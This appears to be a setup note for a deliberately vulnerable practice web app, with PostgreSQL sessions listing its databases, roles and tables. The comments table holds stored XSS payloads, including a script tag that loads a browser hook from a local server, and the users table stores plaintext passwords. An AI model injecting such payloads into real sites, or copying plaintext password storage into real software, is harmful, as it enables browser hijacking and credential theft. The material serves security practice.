Java 21
Postgresql:
bce@BCEs-MacBook-Air ~ % psql -U bce -d break_code_engine
psql (15.10 (Homebrew))
Type "help" for help.

break_code_engine=# \list
                                             List of databases
       Name        | Owner | Encoding | Collate | Ctype | ICU Locale | Locale Provider | Access privileges 
-------------------+-------+----------+---------+-------+------------+-----------------+-------------------
 break_code_engine | bce   | UTF8     | C       | C     |            | libc            | 
 postgres          | bce   | UTF8     | C       | C     |            | libc            | 
 template0         | bce   | UTF8     | C       | C     |            | libc            | =c/bce           +
                   |       |          |         |       |            |                 | bce=CTc/bce
 template1         | bce   | UTF8     | C       | C     |            | libc            | =c/bce           +
                   |       |          |         |       |            |                 | bce=CTc/bce
(4 rows)

break_code_engine=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 bce       | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

break_code_engine=# \dt
         List of relations
 Schema |   Name   | Type  | Owner 
--------+----------+-------+-------
 public | comments | table | bce
 public | users    | table | bce
(2 rows)

break_code_engine=# 


<img width="918" alt="Screenshot 2025-01-01 at 17 37 28" src="https://github.com/user-attachments/assets/571d655c-3f5d-47c5-80b7-800bebd5858a" />












break_code_engine=# select * from comments;
 id |                         text                          
----+-------------------------------------------------------
 22 | test
 23 | Bce
 24 | <script>alert("XSS attack")</script>
 25 | TEST
 26 | <script src="http://127.0.0.1:3000/hook.js"></script>
(5 rows)

break_code_engine=# 
break_code_engine=# truncate table comments;
TRUNCATE TABLE
break_code_engine=# select * from users;
 id | password | username 
----+----------+----------
  4 | password | admin
  5 | pass123  | user1
  6 | welcome  | user2
(3 rows)

<img width="433" alt="Screenshot 2025-01-14 at 20 59 44" src="https://github.com/user-attachments/assets/dd24b1bd-5cd0-4006-86fb-94a502fa7881" />

